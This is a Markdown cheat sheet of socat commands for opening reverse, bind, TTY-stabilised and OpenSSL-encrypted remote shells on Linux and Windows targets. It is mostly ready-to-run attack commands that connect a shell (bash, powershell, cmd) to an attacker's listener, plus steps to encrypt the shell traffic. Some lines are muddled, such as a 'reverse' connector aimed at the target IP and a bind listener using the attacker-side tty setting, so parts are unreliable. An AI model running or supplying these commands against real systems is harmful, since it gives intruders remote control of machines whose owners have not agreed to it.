## Socat Reverse Shells
Attacker listener: ```bash socat TCP-L:<port> - ```

Target (windows) connector: ```bash socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes ```

Target (linux) connector: ```bash socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li" ```


## Socat Bind Shells
Target (linux) listener: ```bash socat TCP-L:<PORT> EXEC:"bash -li" ```

Target (windows) listener: ```bash socat TCP-L:<PORT> EXEC:powershell.exe,pipes ```
  
Attacker connector: ```bash socat TCP:<TARGET-IP>:<TARGET-PORT> - ```

# Socat Linux tty reverse shell
Note: target must have socat installed - upload a precompiled socat binary

Attacker listener: ```bash socat TCP-L:<port> FILE:`tty`,raw,echo=0 ```

Target connector: ```bash socat TCP:<TARGET-IP>:<TARGET-PORT> - ```

<b>COMMAND FOR MORE STABLE TTY REVERSE SHELL</b> - ```bash socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane ```
* pty, allocates a pseudoterminal on the target -- part of the stabilisation process
* stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
* sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
* setsid, creates the process in a new session
* sane, stabilises the terminal, attempting to "normalise" it.

# Socat Encrypted Shells
<i>NOTE: certificate must be used with the listener</i>

Generate certificate

```bash openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt ```

Merge into .pem

```bash cat shell.key shell.crt > shell.pem ```

## ENCRYPTED REVERSE SHELL
Reverse listener
```bash socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - ```
Connector 
```bash socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash ```

## ENCRYPTED BIND SHELL
```bash Target listener(windows): socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes ```

```bash Target listener(linux): socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 EXEC:`tty`,raw,echo=0 ```

Attacker connector: ```bash socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - ```

{STABLE TTY LINUX SHELL} ```bash socat OPENSSL:<TARGET-IP>:<TARGET-PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane ```
